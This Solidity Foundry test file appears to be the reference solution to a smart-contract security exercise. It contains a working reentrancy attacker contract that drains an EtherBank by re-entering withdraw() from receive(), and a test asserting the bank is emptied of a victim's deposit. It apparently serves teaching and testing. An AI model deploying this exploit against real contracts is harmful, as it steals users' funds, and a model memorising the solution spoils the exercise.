// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {EtherBank} from "../src/EtherBank.sol";

/// Reference attacker: re-enter withdraw() from receive() until the bank is dry.
contract ReentrancyAttacker {
    EtherBank public bank;

    constructor(EtherBank _bank) payable {
        bank = _bank;
    }

    function attack() external {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function sweep(address to) external {
        payable(to).transfer(address(this).balance);
    }
}

contract ReentrancySolution is Test {
    EtherBank bank;
    address attacker = makeAddr("attacker");

    function setUp() public {
        bank = new EtherBank();
        // An honest user has 5 ETH in the bank.
        address victim = makeAddr("victim");
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        bank.deposit{value: 5 ether}();
        // Fund this test contract so it can seed the attacker contract.
        vm.deal(address(this), 1 ether);
    }

    function test_exploit() public {
        ReentrancyAttacker a = new ReentrancyAttacker{value: 1 ether}(bank);
        a.attack();
        a.sweep(attacker);

        assertGe(attacker.balance, 6 ether, "attacker should drain victim + own deposit");
        assertEq(address(bank).balance, 0, "bank should be empty");
    }
}
